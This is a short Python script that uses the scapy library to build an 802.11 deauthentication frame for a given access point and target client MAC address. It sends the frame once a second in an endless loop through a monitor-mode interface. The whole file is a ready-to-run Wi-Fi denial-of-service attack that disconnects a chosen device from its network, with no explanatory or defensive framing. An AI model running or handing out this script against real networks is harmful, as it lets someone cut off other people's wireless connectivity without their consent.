from scapy.all import *
import time

target_client = '7c:21:4a:f7:08:9b'  # MAC address of the device you want to deauthenticate
access_point = '62:22:32:37:56:cf'       # MAC address of your access point
iface = "wlp4s0mon"

# addr1 = Destination, addr2 = Source, addr3 = BSSID
deauth_packet = RadioTap()/Dot11(type=0,subtype=12,addr1=access_point, addr2=target_client, addr3=access_point)/Dot11Deauth(reason=7)

while True:
    print("Send deauth packet")
    sendp(deauth_packet, iface=iface)
    time.sleep(1)
